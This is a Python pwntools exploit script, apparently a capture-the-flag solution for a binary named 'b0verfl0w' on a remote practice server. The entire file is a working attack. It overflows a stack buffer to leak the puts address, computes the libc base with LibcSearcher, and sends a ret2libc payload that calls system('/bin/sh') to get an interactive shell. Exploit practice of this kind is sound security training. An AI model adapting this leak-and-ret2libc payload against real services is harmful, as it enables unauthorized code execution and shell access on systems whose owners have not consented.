#!/usr/bin/env python
# -*- encoding: utf-8 -*-
'''
@File    :   exp.py
@Time    :   2021/05/23 15:52:50
@Author  :   eur1ka  
@Version :   2.7
@Contact :   raogx.vip@hotmail.com
@License :   (C)Copyright 2017-2018, Liugroup-NLPR-CASIA
@Desc    :   None
'''

# here put the import lib

from pwn import *
from LibcSearcher import *
import pwnlib
debug = 0
if debug:
    sh = process('b0verfl0w')
else:
    sh = remote('node3.buuoj.cn',26124)
elf = ELF('b0verfl0w')
# libc = ELF()
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main_addr = 0x804850E
sh.recvuntil("What's your name?\n")
payload = 'a' * 0x20 + 'aaaa' + p32(puts_plt) + p32(main_addr) + p32(puts_got)
sh.sendline(payload)

puts_addr = u32(sh.recvuntil("\xf7")[-4:])
libc = LibcSearcher('puts',puts_addr)
libc_base = puts_addr - libc.dump('puts')
system_addr = libc_base + libc.dump('system')
binsh_addr = libc_base + libc.dump('str_bin_sh')
log.info("Success leak puts_addr:0x%x"%puts_addr)
sh.recvuntil("What's your name?\n")
payload = 'a' * 0x20 + 'aaaa' + p32(system_addr) + p32(main_addr) + p32(binsh_addr)
sh.sendline(payload)


sh.interactive()